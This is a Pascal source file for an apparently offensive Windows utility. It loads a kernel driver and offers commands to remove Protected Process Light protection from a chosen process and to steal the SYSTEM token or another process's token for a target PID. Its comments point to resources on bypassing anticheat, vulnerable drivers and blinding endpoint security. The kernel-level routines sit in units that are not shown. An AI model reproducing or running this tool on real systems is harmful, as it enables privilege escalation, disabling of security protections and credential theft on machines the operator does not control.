{$mode delphi}

program memRW;

uses windows,sysutils, udrv,  urtcore_utils, uutils;


   type
      TByteBits = bitpacked record
        Bit0, Bit1, Bit2, Bit3, Bit4, Bit5, Bit6, Bit7: Boolean;
      end;

       _PS_PROTECTION  =  record
          // High byte of index offset, low byte of index is bit count
         level:uchar;
         bits:byte;
         //Type_	:byte; //index $0003; //: 3;
	 //Audit:byte; //index $0301; //	: 1;
	 //Signer:byte;// index $0701 ; //:4;
end;


_PS_PROTECTED_SIGNER=
(
    PsProtectedSignerNone = 0,
    PsProtectedSignerAuthenticode = 1,
    PsProtectedSignerCodeGen = 2,
    PsProtectedSignerAntimalware = 3,
    PsProtectedSignerLsa = 4,
    PsProtectedSignerWindows = 5,
    PsProtectedSignerWinTcb = 6,
    PsProtectedSignerMax = 7
);

_PS_PROTECTED_TYPE=
(
    PsProtectedTypeNone = 0,
    PsProtectedTypeProtectedLight = 1,
    PsProtectedTypeProtected = 2,
    PsProtectedTypeMax = 3
);



var
targetpid:dword64=0;
sourcepid:dword=0;


//https://guidedhacking.com/threads/how-to-bypass-kernel-anticheat-develop-drivers.11325/
//https://github.com/eclypsium/Screwed-Drivers/blob/master/DRIVERS.md
//https://github.com/br-sn/CheekyBlinder
begin
if paramcount=0 then exit;
//
//or use RtlGetVersion
ReleaseID:=ReadRegEntry ('SOFTWARE\Microsoft\Windows NT\CurrentVersion','ReleaseID' );
if ReleaseID ='' then ReleaseID :=ReadRegEntry ('SOFTWARE\Microsoft\Windows NT\CurrentVersion','CurrentBuildNumber' );
if ReleaseID ='' then begin writeln('No ReleaseID');exit;end;
writeln('ReleaseID:'+releaseid);
if SetOffsets =false then begin writeln('Offsets unknown');exit; end;
{
writeln('ActiveProcessLinks:'+inttohex(offsets.nextFlink,sizeof(offsets.nextFlink)));
writeln('SignatureProtect:'+inttohex(offsets.SignatureProtect,sizeof(offsets.SignatureProtect)));
writeln('Token:'+inttohex(offsets.Token ,sizeof(offsets.Token)));
writeln('ImageFileName:'+inttohex(offsets.ImageFileName,sizeof(offsets.ImageFileName)));
}
//
if (paramcount=2) and (paramstr(1)='load')
   then LoadDriver (ParamStr (2),stringreplace(ExtractFileName (ParamStr (2)),ExtractFileExt (ParamStr (2)),'',[]));

if (paramcount=2) and (paramstr(1)='unload')
   then UnloadDriver(stringreplace(ExtractFileName (ParamStr (2)),ExtractFileExt (ParamStr (2)),'',[])) ;

if (paramcount >=1) and (paramstr(1)='list') then
  begin
  listprocess();
  end;

if (paramcount =2) and (paramstr(1)='removeppl') then
  begin
  targetpid:=strtoint64(ParamStr(2));
  if RemovePPL (targetpid)=false then writeln('RemovePPL failed');
  end;

if (paramcount =2) and (paramstr(1)='makesystem') then
  begin
  targetpid:=strtoint64(ParamStr(2));
  if StealToken(4,targetpid)=false then writeln('RemovePPL failed');
  end;

if (paramcount =3) and (paramstr(1)='stealtoken') then
  begin
  sourcepid:=strtoint64(ParamStr(2));
  targetpid:=strtoint64(ParamStr(3));
  if StealToken(sourcepid,targetpid)=false then writeln('RemovePPL failed');
  end;

end.

 
 
 
 
 
 
 
